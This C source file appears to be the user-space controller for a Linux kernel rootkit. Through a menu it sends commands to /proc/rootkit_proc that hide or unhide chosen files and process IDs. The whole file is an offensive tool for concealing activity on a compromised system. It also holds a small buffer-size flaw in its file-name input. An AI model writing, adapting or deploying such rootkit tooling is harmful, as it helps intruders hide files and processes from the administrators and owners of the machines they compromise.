#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>
#include <string.h>


void display_intro(void){
	printf("Options:\n");
	printf("\t1. Hide file\n");
	printf("\t2. Unhide file\n");
	printf("\t3. Hide PID\n");
	printf("\t4. Unhide PID\n");
}

int get_option(void){
	char c;
	do{
		printf("Select an option: ");
		c = fgetc(stdin);
	} while (c < '1' || c > '4');
	return c - '0';
}

void send_msg_file(int id, int fd){
	char filename[256];
	printf("Introduce the name of the file: ");
	scanf("%256s", filename);

	int size = sizeof(id) + strlen(filename) + 1;
	void* msg = malloc(size);
	memcpy(msg, &id, sizeof(id));
	memcpy(msg + sizeof(id), filename, strlen(filename) + 1);

	if (write(fd, msg, size) != size)
		printf("ERROR WRITE\n");

	free(msg);
}

void send_msg_pid(int id, int fd){
	int msg[2];
	msg[0] = id;
	printf("Introduce the PID of the process: ");
	scanf("%d", &msg[1]);

	if (write(fd, msg, sizeof(msg)) != sizeof(msg))
		printf("ERROR WRITE\n");
}

void hide_file(int fd){
	send_msg_file(1, fd);
	printf("File hidden successfully!\n");
}

void unhide_file(int fd){
	send_msg_file(2, fd);
	printf("File unhidden successfully!\n");
}

void hide_pid(int fd){
	send_msg_pid(3, fd);
	printf("PID hidden successfully!\n");
}

void unhide_pid(int fd){
	send_msg_pid(4, fd);
	printf("PID unhidden successfully!\n");
}

int main(int argc, char** argv){
	int fd;
	if ((fd = open("/proc/rootkit_proc", O_WRONLY)) == -1){
		printf("ERROR OPEN\n");
		return -1;
	}
	printf("Welcome!\n");

	while (1){
		display_intro();
		int option = get_option();
		switch (option){
			case 1:
				hide_file(fd);
				break;
			case 2:
				unhide_file(fd);
				break;
			case 3:
				hide_pid(fd);
				break;
			case 4:
				unhide_pid(fd);
				break;
			default:
				printf("NANI\n");
		}
	}
	close(fd);
	return 0;
}
